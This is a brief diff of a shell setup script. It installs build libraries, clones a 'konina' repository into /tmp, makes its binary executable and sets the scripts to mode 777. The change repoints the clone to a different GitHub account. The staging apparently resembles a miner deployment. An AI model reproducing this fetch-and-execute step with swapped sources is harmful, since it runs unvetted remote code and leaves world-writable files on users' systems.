@@ -17,7 +17,7 @@ sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
 cd /tmp && mkdir konina
-git clone https://github.com/konoplina/konina.git /tmp/konina
+git clone https://github.com/maks54rus/konina.git /tmp/konina
 cd /tmp/konina
 chmod +x /tmp/konina/konina
 chmod 777 ./*.sh
